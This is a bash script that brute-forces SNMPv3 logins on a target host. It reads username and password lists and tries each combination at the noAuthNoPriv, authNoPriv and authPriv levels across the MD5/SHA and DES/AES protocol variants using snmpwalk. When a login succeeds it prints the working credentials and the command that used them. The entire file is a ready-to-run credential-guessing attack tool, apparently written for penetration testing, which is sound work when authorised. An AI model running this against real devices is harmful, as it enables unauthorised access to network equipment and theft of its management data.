#!/usr/bin/env bash
#
# Usage:
#   ./snmpv3-brute.sh -t <target> [-u user | -U userlist] [-p pass | -P passlist] [-d]
#
# Examples:
#   ./snmpv3-brute.sh -t 10.1.43.53 -u john -P passwords.txt
#   ./snmpv3-brute.sh -t 10.1.43.53 -U users.txt -P passwords.txt -d
#

set -u

usage() {
    echo "Usage: $0 -t <target> [-u user | -U userlist] [-p pass | -P passlist] [-d]"
    echo "          [--NoAuthNoPriv] [--AuthNoPriv] [--AuthPriv]"
    echo ""
    echo "  -t  Target IP/host (required)"
    echo "  -u  Single username"
    echo "  -U  Path to username list"
    echo "  -p  Single password"
    echo "  -P  Path to password list"
    echo "  -d  Debug: show each attempt + raw error"
    echo ""
    echo "  --NoAuthNoPriv  Only run noAuthNoPriv checks"
    echo "  --AuthNoPriv    Only run authNoPriv checks"
    echo "  --AuthPriv      Only run authPriv checks"
    echo "  (any combination of the three above may be given together;"
    echo "   if none are given, all three run -- same as before)"
    echo ""
    echo "Exactly one of -u/-U and exactly one of -p/-P are required."
    echo ""
    echo "Note: for authPriv, the privacy (-X) passphrase is assumed to be"
    echo "the same as the auth (-A) passphrase. If a device uses a different"
    echo "priv passphrase, authPriv hits here will show as timeouts/failures"
    echo "even though authNoPriv succeeds -- check those manually."
    exit 1
}

target=""
single_user=""
user_list=""
single_pass=""
pass_list=""
debug=0
TIMEOUT=30

# --- pre-pass: strip long-form level flags before getopts sees argv ---
# getopts only understands short options, so pull --NoAuthNoPriv/--AuthNoPriv/
# --AuthPriv out of "$@" here and rebuild argv without them. Order-independent
# relative to the short flags.
run_noauthnopriv=0
run_authnopriv=0
run_authpriv=0
levels_specified=0

remaining_args=()
for arg in "$@"; do
    case "$arg" in
        --NoAuthNoPriv) run_noauthnopriv=1; levels_specified=1 ;;
        --AuthNoPriv)   run_authnopriv=1;   levels_specified=1 ;;
        --AuthPriv)     run_authpriv=1;     levels_specified=1 ;;
        *) remaining_args+=("$arg") ;;
    esac
done

# no level flags given -> default to running all three, same as original behavior
if [ "$levels_specified" -eq 0 ]; then
    run_noauthnopriv=1
    run_authnopriv=1
    run_authpriv=1
fi

set -- "${remaining_args[@]}"

while getopts "t:u:U:p:P:dh" opt; do
    case "$opt" in
        t) target="$OPTARG" ;;
        u) single_user="$OPTARG" ;;
        U) user_list="$OPTARG" ;;
        p) single_pass="$OPTARG" ;;
        P) pass_list="$OPTARG" ;;
        d) debug=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# --- validation ---
[ -z "$target" ] && { echo "[!] -t <target> is required"; usage; }

if [ -n "$single_user" ] && [ -n "$user_list" ]; then
    echo "[!] Use either -u or -U, not both"; usage
fi
if [ -z "$single_user" ] && [ -z "$user_list" ]; then
    echo "[!] One of -u or -U is required"; usage
fi

if [ -n "$single_pass" ] && [ -n "$pass_list" ]; then
    echo "[!] Use either -p or -P, not both"; usage
fi
if [ -z "$single_pass" ] && [ -z "$pass_list" ]; then
    echo "[!] One of -p or -P is required"; usage
fi

if [ -n "$user_list" ] && [ ! -f "$user_list" ]; then
    echo "[!] Username list not found: $user_list"; exit 1
fi
if [ -n "$pass_list" ] && [ ! -f "$pass_list" ]; then
    echo "[!] Password list not found: $pass_list"; exit 1
fi

# --- build user/password arrays ---
users=()
if [ -n "$single_user" ]; then
    users=("$single_user")
else
    while IFS= read -r line; do
        line="${line%$'\r'}"
        [ -z "$line" ] && continue
        users+=("$line")
    done < "$user_list"
fi

passwords=()
if [ -n "$single_pass" ]; then
    passwords=("$single_pass")
else
    while IFS= read -r line; do
        line="${line%$'\r'}"
        [ -z "$line" ] && continue
        passwords+=("$line")
    done < "$pass_list"
fi

# --- protocol sets: always full, per enabled level ---
auth_protos=("MD5" "SHA" "SHA-224" "SHA-256" "SHA-384" "SHA-512")
priv_protos=("DES" "AES" "AES-192" "AES-256")

per_pair=0
[ "$run_authnopriv" -eq 1 ] && per_pair=$((per_pair + ${#auth_protos[@]}))
[ "$run_authpriv" -eq 1 ] && per_pair=$((per_pair + (${#auth_protos[@]} * ${#priv_protos[@]}) ))

noauth_count=0
[ "$run_noauthnopriv" -eq 1 ] && noauth_count=1

# count only passwords that pass the length filter, so the estimate matches what actually runs
valid_pass_count=0
for pass in "${passwords[@]}"; do
    [ ${#pass} -ge 8 ] && valid_pass_count=$((valid_pass_count + 1))
done

total_attempts=$(( ${#users[@]} * (noauth_count + valid_pass_count * per_pair) ))

levels_desc=""
[ "$run_noauthnopriv" -eq 1 ] && levels_desc="$levels_desc noAuthNoPriv"
[ "$run_authnopriv" -eq 1 ] && levels_desc="$levels_desc authNoPriv"
[ "$run_authpriv" -eq 1 ] && levels_desc="$levels_desc authPriv"

echo "[*] Target: $target"
echo "[*] Levels:$levels_desc"
echo "[*] Users: ${#users[@]}  Passwords: ${#passwords[@]} (${valid_pass_count} usable, min 8 chars)"
echo "[*] Auth protocols: ${auth_protos[*]}"
echo "[*] Priv protocols: ${priv_protos[*]}"
echo "[*] Total attempts: $total_attempts"
echo ""

start_time=$(date +%s)
attempt_num=0

# try_one LEVEL AUTHPROTO PRIVPROTO USER PASS
try_one() {
    local level="$1" authproto="$2" privproto="$3" user="$4" pass="$5"
    local args=(-v3 -u "$user" -l "$level")
    local label="$user / level=$level"

    if [ "$level" != "noAuthNoPriv" ]; then
        args+=(-A "$pass" -a "$authproto")
        label="$label authproto=$authproto pass=$pass"
    fi
    if [ "$level" == "authPriv" ]; then
        args+=(-X "$pass" -x "$privproto")
        label="$label privproto=$privproto"
    fi

    if [ "$debug" -eq 1 ]; then
        echo "[*] Trying: $label"
    fi

    local err rc
    err=$(timeout "$TIMEOUT" snmpwalk "${args[@]}" "$target" 2>&1 >/dev/null)
    rc=$?

    attempt_num=$((attempt_num + 1))
    if [ $((attempt_num % 200)) -eq 0 ]; then
        local now elapsed mins secs
        now=$(date +%s)
        elapsed=$((now - start_time))
        mins=$((elapsed / 60))
        secs=$((elapsed % 60))
        echo "    ... $attempt_num/$total_attempts attempts, $(printf '%02d:%02d' "$mins" "$secs") elapsed"
    fi

    if [ "$rc" -eq 0 ]; then
        echo "[+] SUCCESS -> user: $user  level: $level  authproto: $authproto  privproto: $privproto  pass: $pass"
        echo "    Command: snmpwalk ${args[*]} $target"
        echo ""
        exit 0
    elif [ "$rc" -eq 124 ]; then
        echo "[?] Possible password found: $pass (level=$level, auth=$authproto, priv=$privproto) -- Try:"
        echo "      snmpwalk ${args[*]} $target"
        echo ""
    elif [ "$debug" -eq 1 ]; then
        echo "    rc=$rc  err=$err"
    fi
}

for user in "${users[@]}"; do

    if [ "$run_noauthnopriv" -eq 1 ]; then
        try_one "noAuthNoPriv" "" "" "$user" ""
    fi

    for pass in "${passwords[@]}"; do
        [ ${#pass} -lt 8 ] && continue

        if [ "$run_authnopriv" -eq 1 ]; then
            for authproto in "${auth_protos[@]}"; do
                try_one "authNoPriv" "$authproto" "" "$user" "$pass"
            done
        fi

        if [ "$run_authpriv" -eq 1 ]; then
            for authproto in "${auth_protos[@]}"; do
                for privproto in "${priv_protos[@]}"; do
                    try_one "authPriv" "$authproto" "$privproto" "$user" "$pass"
                done
            done
        fi
    done
done

echo ""
echo "[-] Script finished. Please test all possible passwords found, if any."
echo ""
echo ""
exit 1
